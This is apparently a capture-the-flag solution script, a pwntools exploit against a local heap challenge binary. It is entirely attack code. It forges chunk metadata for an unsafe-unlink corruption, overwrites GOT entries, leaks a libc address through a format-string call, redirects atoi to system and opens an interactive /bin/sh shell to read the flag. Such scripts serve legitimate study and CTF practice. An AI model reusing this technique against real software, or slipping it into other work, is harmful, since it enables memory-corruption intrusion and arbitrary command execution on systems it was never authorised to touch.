from pwn import * 
import sys 


LOCAL = 0 
filename = "./challenge" 
elf = ELF(filename) 
if int(sys.argv[1]) == LOCAL : 
    sh = process(filename)
    libc = elf.libc  
else : 
    exit(0)  

def buy(string) : 
    print(sh.recv())
    sh.sendline('1')
    print(sh.recv())
    sh.send(string) 

def put(id) : 
    print(sh.recv())
    sh.sendline('2')
    sh.recv()
    sh.sendline(str(id)) 

def write(id, string) : 
    print(sh.recv())
    sh.sendline('3')
    sh.sendline(str(id))
    print(sh.recv())
    sh.send(string)

ptr = 0x6021A0
fakeFD = ptr - 0x18
fakeBK = ptr - 0x10 

context.terminal = ['tmux', 'new-window']
# gdb.attach(sh, 'b * 0x400A67') 
print(sh.recv()) 
sh.sendline('hacmao')

buy('aaaa')
buy('bbbb')
write(0, p64(0) + p64(0xf1) + p64(fakeFD) + p64(fakeBK) + 'a' * 0xd0 + p64(0xf0)) 
put(1) 

write(0, p64(0) * 3 + p64(fakeFD) + p64(elf.got['free']) + p64(elf.got['atoi']) + '/bin/sh\x00') 
write(2, p64(elf.plt['printf'])) 

# leak libc 
sh.recv()
sh.sendline('a') 
sh.recv()

sh.sendline('%lx') 
libc.address = int(sh.recvline().strip(), 16) - 0x3c4963 
system = libc.sym['__libc_system']
log.success("LIBC = " + hex(libc.address))
log.success("SYSTEM = " + hex(system))
# gdb.attach(sh, 'b * 0x400A67') 

# write atoi -> system 
print(sh.recv()) 
sh.sendline('aa') # 3 
sh.sendline('a') # 1 
print(sh.recv())
sh.send(p64(system)) 

# get shell 
print('get shell ....')
sh.sendline('/bin/sh\x00')
sh.sendline("cat flag")
sh.interactive() 
